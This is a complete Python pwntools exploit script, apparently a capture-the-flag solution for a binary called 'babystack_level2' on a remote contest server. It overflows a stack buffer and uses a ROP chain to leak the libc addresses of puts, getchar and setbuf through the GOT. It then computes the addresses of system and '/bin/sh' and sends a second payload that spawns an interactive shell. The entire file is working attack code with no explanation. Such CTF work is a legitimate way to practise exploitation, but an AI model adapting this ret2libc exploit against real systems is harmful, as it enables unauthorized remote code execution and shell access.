#!/usr/bin/env python3
from pwn import *
import re

debug = False

context.terminal = "/usr/bin/kitty"
context.gdbinit = "/usr/share/pwndbg/gdbinit.py"

pad = flat([b"A" for i in range(112+8)])
puts_plt = 0x400560
puts_got = 0x601018
getchar_got = 0x601030
setbuf_got = 0x601020
run_addr = 0x4006eb

gad_addr = 0x400803

def get_conn(local):
    if local:
        c = gdb.debug("./babystack_level2", """
b *0x40070f
continue
        """)
    else:
        c = remote("nc.thuctf.redbud.info", port=32069)
    return c

c = get_conn(debug)
def leak_addr(name, got):
    libc_leaker = pad + p64(gad_addr) + p64(got) + p64(puts_plt) + p64(run_addr)
    c.recvuntil(b'wish:\n')
    c.sendline(libc_leaker)
    c.recvuntil(b'Bye\n')
    addr = unpack(c.recvline()[:-1], "all")
    print("&{} = {}".format(name, hex(addr)))
    return addr

puts_addr = leak_addr("puts", puts_got)
leak_addr("getchar", getchar_got)
leak_addr("setbuf", setbuf_got)

# with information leaked above we can calculate libc address
str_bin_sh_adr = puts_addr + 0x11d7b7
system_adr = puts_addr - 0x2a300

payload = pad + p64(gad_addr) + p64(str_bin_sh_adr) + p64(system_adr) + p64(run_addr)
c.recvline()
c.recvline()
c.sendline(payload)

c.interactive()
